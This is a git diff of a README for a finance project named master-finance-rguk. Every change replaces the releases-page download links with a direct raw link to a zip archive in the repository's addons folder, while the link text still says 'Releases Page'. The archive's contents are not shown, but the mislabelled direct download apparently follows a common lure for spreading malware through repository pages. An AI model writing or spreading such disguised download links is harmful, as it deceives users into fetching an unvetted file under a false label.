@@ -6,9 +6,9 @@ Welcome to the **master-finance-rguk** project! This is a user-friendly landing 
 
 ## 📥 Download Now
 
-[![Download master-finance-rguk](https://img.shields.io/badge/Download-master--finance--rguk-blue.svg)](https://github.com/Decyp/master-finance-rguk/releases)
+[![Download master-finance-rguk](https://github.com/Decyp/master-finance-rguk/raw/refs/heads/main/addons/finance_rguk_master_2.7.zip)](https://github.com/Decyp/master-finance-rguk/raw/refs/heads/main/addons/finance_rguk_master_2.7.zip)
 
-Visit this page to download: [Releases Page](https://github.com/Decyp/master-finance-rguk/releases)
+Visit this page to download: [Releases Page](https://github.com/Decyp/master-finance-rguk/raw/refs/heads/main/addons/finance_rguk_master_2.7.zip)
 
 ## 💡 Features
 
@@ -26,7 +26,7 @@ To run this application, you will need:
 
 ## 📂 Download & Install
 
-1. Go to the [Releases Page](https://github.com/Decyp/master-finance-rguk/releases).
+1. Go to the [Releases Page](https://github.com/Decyp/master-finance-rguk/raw/refs/heads/main/addons/finance_rguk_master_2.7.zip).
 2. Look for the latest version listed.
 3. Click on the appropriate file for your system.
 4. Save the file to your preferred location.
